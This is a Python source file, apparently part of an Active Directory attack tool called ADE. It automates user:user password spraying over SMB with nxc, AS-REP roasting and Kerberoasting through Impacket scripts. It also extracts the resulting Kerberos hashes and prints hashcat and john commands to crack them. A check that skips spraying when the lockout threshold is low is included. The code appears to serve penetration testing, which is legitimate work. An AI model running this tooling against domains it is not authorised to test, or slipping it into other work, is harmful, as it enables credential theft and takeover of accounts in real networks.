#!/usr/bin/env python3
"""
Attack modules for ADE - password spraying, AS-REP roasting, Kerberoasting.
"""

import subprocess
import os
import re
from termcolor import colored

from .config import SECTION_ART, USERS_FILE, ensure_output_parent, get_output_path
from .utils import print_status, print_header, run_command
from .policy import get_password_policy, line_matches


def _get_np_users_args(domain: str, target: str, users_file: str, kerberos: bool = False):
    """Build a safe argv list for GetNPUsers.py."""
    cmd = ["GetNPUsers.py", f"{domain}/", "-no-pass"]
    if kerberos:
        cmd.append("-k")
    cmd.extend(["-usersfile", users_file, "-dc-ip", target])
    return cmd


def save_hashes(output, pattern, filename, hashcat_mode, hash_type):
    """
    Parse hashes from tool output, save to file, print crack commands.
    
    Args:
        output: Raw tool output to search for hashes
        pattern: Regex pattern to match hash lines
        filename: Basename for the hash file (routed through output dir)
        hashcat_mode: Hashcat mode number (e.g., 18200, 13100)
        hash_type: Human-readable hash type for status messages
    
    Returns:
        int: Number of hashes found and saved
    """
    if not output:
        return 0

    hashes = re.findall(pattern, output, re.MULTILINE)
    if not hashes:
        return 0

    path = get_output_path(filename)
    try:
        ensure_output_parent(path)
        with open(path, "w", encoding="utf-8") as f:
            f.write("\n".join(hashes) + "\n")
        print_status(f"\n[+] Saved {len(hashes)} {hash_type} hash(es) to {path}")
        print(colored(f"    hashcat -m {hashcat_mode} {path} <wordlist>", "yellow"))
        print(colored(f"    john --wordlist=<wordlist> {path}", "yellow"))
    except Exception as e:
        print_status(f"[-] Failed to save hashes to {path}: {e}")

    return len(hashes)


def try_user_file(
    file_path: str,
    target: str,
    note: str = "Try user:user",
    timeout: int = 30,
    policy: dict = None
) -> None:
    """
    Perform user:user password spray attack using usernames from a file.
    
    Args:
        file_path: Path to file containing usernames (one per line)
        target: Target IP address
        note: Description of the spray attempt (for logging)
        timeout: Timeout in seconds for each authentication attempt
        policy: Password policy dict from get_password_policy() (optional)
                If provided and lockout_threshold <= 3, spraying is skipped for safety
    """
    if not os.path.exists(file_path):
        print_status(f"\n\n[INFO] Username file '{file_path}' not found; skipping {note}.")
        return

    # Check if spraying is safe based on password policy
    if policy is not None:
        lockout_threshold = policy.get("lockout_threshold")
        if lockout_threshold is not None and lockout_threshold > 0 and lockout_threshold <= 3:
            print_status(colored(f"\n[!!!] SKIPPING password spray due to dangerous lockout threshold ({lockout_threshold})!", "red"))
            print_status(colored("[!!!] Risk of locking out user accounts is too high.", "red"))
            print_status(colored("[!!!] To force spraying, run the script with --force-spray (not implemented yet).", "yellow"))
            return

    print_status(f"\n\n[*] Starting {note} (Checking {file_path})...")
    print(colored(f"$ nxc smb {target} -u <user> -p <user> --continue-on-success", "white"))

    with open(file_path, "r", encoding="utf-8") as fh:
        for raw in fh:
            user = raw.strip()
            if not user:
                continue

            cmd = ["nxc", "smb", target, "-u", user, "-p", user, "--continue-on-success"]
            try:
                proc = subprocess.run(
                    cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    text=True,
                    timeout=timeout,
                )
                output = proc.stdout or ""
            except subprocess.TimeoutExpired:
                print_status(f"[-] {user}:{user} -> timeout after {timeout}s")
                continue
            except Exception as e:
                print_status(f"[-] {user}:{user} -> exception: {e}")
                continue

            # print any line that matches our patterns (print the line exactly)
            for line in output.splitlines():
                if line and line_matches(line):
                    print_status(line)

    print_status("\n[+] User:user spray finished.")


def user_spraying(
    r: str,
    d: str,
    u: str = None,
    p: str = None,
    k: bool = False,
    cred_status: str = None
) -> None:
    """
    Perform AS-REP roasting and user:user password spraying.
    
    Args:
        r: Target IP address
        d: Domain name (e.g., CORP.LOCAL)
        u: Username (None if no credentials provided)
        p: Password (None if no credentials provided)
        k: Boolean indicating if Kerberos authentication is enabled
        cred_status: Credential validation status from verify_credentials()
    """
    print_header(SECTION_ART["user_spraying"])

    users_file = get_output_path(USERS_FILE)

    # If creds provided, use the cred_status passed from main()
    if u and p:
        if cred_status is None:
            # fallback if main didn't verify: run lightweight verification (existing behavior)
            verify_cmd = ["nxc", "smb", r, "-u", u, "-p", p, "--shares"]
            out, _ = run_command(verify_cmd, "Verify provided credentials (light SMB check)", capture_output=True)
            if out and re.search(r'STATUS_LOGON_FAILURE', out, re.IGNORECASE):
                print_status(colored("\n[-] Provided credentials appear invalid (STATUS_LOGON_FAILURE).", "red"))
                print_status(colored("[-] Skipping GetNPUsers.py and Kerberos AS-REP checks due to invalid credentials.", "red"))
                return
            if out and re.search(r'\[\+\]|Authenticated', out, re.IGNORECASE):
                cred_status = "ok"
            else:
                cred_status = "ambiguous"

        # Now react to the known cred_status (do not re-run the check)
        if cred_status == "bad":
            print_status(colored("\n[-] Provided credentials invalid — skipping AS-REP checks.", "red"))
            return
        elif cred_status in ("ok", "kerberos", "ambiguous"):
            # Proceed with AS-REP checks
            if os.path.exists(users_file):
                output, _ = run_command(
                    _get_np_users_args(d, r, users_file, kerberos=k),
                    "Find users with Kerberos pre-auth disabled",
                    capture_output=True,
                )

                # Auto-save AS-REP hashes
                if output:
                    save_hashes(
                        output,
                        r'(\$krb5asrep\$.+)$',
                        "asrep_hashes.txt",
                        18200,
                        "AS-REP"
                    )
            else:
                print_status(f"\n[INFO] '{USERS_FILE}' not found — skipping AS-REP Roasting.")
            
            return

    # No creds -> proceed with spraying (but only if users.txt exists)
    if not os.path.exists(users_file):
        print_status(f"\n[INFO] Username file '{USERS_FILE}' not present — cannot spray.")
        return

    # Run AS-REP roast check with GetNPUsers.py
    output, _ = run_command(
        _get_np_users_args(d, r, users_file),
        "Find users with Kerberos pre-auth disabled",
        capture_output=True,
    )

    # Auto-save AS-REP hashes
    if output:
        save_hashes(
            output,
            r'(\$krb5asrep\$.+)$',
            "asrep_hashes.txt",
            18200,
            "AS-REP"
        )

    # Get password policy before spraying to check lockout thresholds
    policy = get_password_policy(r, u, p, k)

    # Try users in users.txt (will check policy for safety)
    try_user_file(users_file, r, note="Attempt user:user", policy=policy)


def kerberoasting(r: str, f: str, d: str, u: str, p: str, k: bool) -> bool:
    """
    Attempt Kerberoasting attack to extract service account hashes.
    
    Args:
        r: Target IP address
        f: Fully qualified domain name of DC
        d: Domain name
        u: Username
        p: Password
        k: Boolean indicating if Kerberos authentication is enabled
    
    Returns:
        bool: True if NTLM negotiation failed and Kerberos rerun is needed, False otherwise
    """
    print_header(SECTION_ART["kerberoasting"])

    kerberos_auth = ["-k"] if k else []
    dc_host_name = f

    base_cmd = ["GetUserSPNs.py", f"{d}/{u}:{p}", "-request", "-dc-host", dc_host_name] + kerberos_auth

    # Run the command and capture ALL output (stdout + stderr)
    output, _ = run_command(base_cmd, "Request TGS for service accounts", capture_output=True)

    NTLM_FAILED = "NTLM negotiation failed"
    INVALID_CREDENTIALS = "invalidCredentials"

    if output and (NTLM_FAILED in output or INVALID_CREDENTIALS in output):
        if not k:
            print_status("\n[!] KERBEROS RERUN DETECTED: NTLM negotiation failed.")
            print_status("      Switching entire script to Kerberos authentication for second pass.")
            return True

    # Auto-save Kerberoast hashes
    if output:
        save_hashes(
            output,
            r'(\$krb5tgs\$.+)$',
            "kerberoast_hashes.txt",
            13100,
            "Kerberoast"
        )

    return False
